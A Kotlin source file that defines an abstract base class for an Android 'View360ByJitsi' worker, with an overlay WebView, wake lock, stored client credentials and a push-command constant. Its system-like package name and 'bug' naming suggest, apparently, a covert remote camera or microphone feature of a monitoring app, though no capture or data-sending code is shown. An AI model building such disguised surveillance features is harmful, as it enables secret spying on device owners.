package com.android.services.workers.View360ByJitsi

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.WindowManager
import android.webkit.WebView
import androidx.work.Data
import com.android.services.interfaces.IWorkerProcessing

abstract class View360ByJitsiCommandProcessingBase (
    val applicationContext: Context,
): IWorkerProcessing {
    protected val windowManagerFlagOverlay =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
    protected var mWindowManager: WindowManager? = null
    protected var mWebView: WebView? = null
    protected val mHandler by lazy {
        Handler(Looper.getMainLooper())
    }

    protected var loadingFinished = true
    protected var redirect = false
    protected var clientUserName = ""
    protected var clientPassword = ""
    internal var wakeLock: PowerManager.WakeLock? = null

    companion object {
        internal const val TAG = "View360ByJitsi"
        internal const val TAG_VIEW_360_BUG_WORK = "myApp:TOSView360Work"
        internal const val VIEW_360_BY_JITSI_NOTIFICATION_ID = 116
         val VIEW_360_BY_JITSI_WORKER_TAG=View360ByJitsiMeetCommandWorker::class.java.name
        const val VIEW_360_BY_Jitsi_PUSH="VIEW360PUSHBYJITSI"
        @JvmStatic
        var view360ByJitsiBugStatus: String? = null
    }

    abstract fun initialize()
    abstract fun parseIntent(data: Data?)
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(data: Data) {
        parseIntent(data)
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}